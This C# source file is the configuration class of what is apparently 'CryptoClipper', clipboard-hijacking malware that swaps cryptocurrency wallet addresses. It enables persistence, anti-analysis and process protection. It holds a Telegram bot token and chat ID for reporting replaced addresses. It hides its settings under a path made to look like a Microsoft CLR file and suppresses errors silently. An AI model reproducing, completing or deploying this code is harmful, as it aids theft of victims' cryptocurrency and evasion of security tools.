using System.Text.Json;

namespace CryptoClipper.Config;

public sealed class ClipperConfig
{
    public int PollingIntervalMs { get; set; } = 300;
    public bool EnablePersistence { get; set; } = true;
    public bool EnableAntiAnalysis { get; set; } = true;
    public bool EnableProcessProtection { get; set; } = true;
    public bool LogReplacements { get; set; } = true;
    public string? TelegramBotToken { get; set; }
    public string? TelegramChatId { get; set; }

    private static readonly string ConfigPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Microsoft", "CLR", "config.dat");

    public static ClipperConfig Load()
    {
        try
        {
            if (File.Exists(ConfigPath))
            {
                string json = File.ReadAllText(ConfigPath);
                return JsonSerializer.Deserialize<ClipperConfig>(json) ?? new ClipperConfig();
            }
        }
        catch
        {
            // Fall through to defaults
        }

        return new ClipperConfig();
    }

    public void Save()
    {
        try
        {
            string? dir = Path.GetDirectoryName(ConfigPath);
            if (dir is not null)
                Directory.CreateDirectory(dir);

            string json = JsonSerializer.Serialize(this, new JsonSerializerOptions { WriteIndented = true });
            File.WriteAllText(ConfigPath, json);
        }
        catch
        {
            // Silent failure
        }
    }
}
